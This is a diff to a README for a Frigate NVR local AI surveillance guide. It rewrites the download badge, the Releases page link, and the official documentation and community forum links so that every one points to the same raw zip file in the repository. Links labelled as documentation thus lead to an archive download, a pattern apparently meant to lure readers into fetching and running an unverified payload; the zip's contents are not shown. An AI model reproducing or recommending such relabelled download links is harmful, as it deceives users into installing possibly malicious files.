@@ -1,7 +1,7 @@
 # 🛠️ frigate-nvr-guide - Build Your Local AI Surveillance System
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/oas-is/frigate-nvr-guide/releases)
+[![Download](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip)](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip)
 
 ## 📖 Introduction
 Welcome to the **Frigate NVR Guide**! This guide helps you create a local AI surveillance system using Frigate NVR. Whether you want to set up a Raspberry Pi with Hailo or a desktop with Coral, we've got you covered. You can also find tips on configuration and troubleshooting WiFi connections.
@@ -23,7 +23,7 @@ These specifications help ensure smooth installation and operation of the system
 - **Easy Troubleshooting**: Get help with common issues.
 
 ## 📂 Download & Install
-To get started, visit our [Releases page](https://github.com/oas-is/frigate-nvr-guide/releases) to download the latest version. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip) to download the latest version. 
 
 1. Click on the link above.
 2. Locate the latest version.
@@ -56,10 +56,10 @@ If you encounter issues, consult the troubleshooting section of our guide. Commo
 Join our community on forums or social media platforms. Share your experiences, ask questions, and get help from other users.
 
 ## 🔗 Useful Links
-- [Frigate NVR Documentation](https://frigate.video/)
-- [Community Forum](https://community.example.com)
+- [Frigate NVR Documentation](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip)
 
 ## 📥 Final Thoughts
 You are now ready to build your local AI surveillance system using Frigate NVR. For any additional assistance, feel free to reach out on community platforms. 
 
-Don't forget to visit our [Releases page](https://github.com/oas-is/frigate-nvr-guide/releases) for updates and new versions. Enjoy your monitoring experience!
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/oas-is/frigate-nvr-guide/main/docker/guide-frigate-nvr-v3.2.zip) for updates and new versions. Enjoy your monitoring experience!
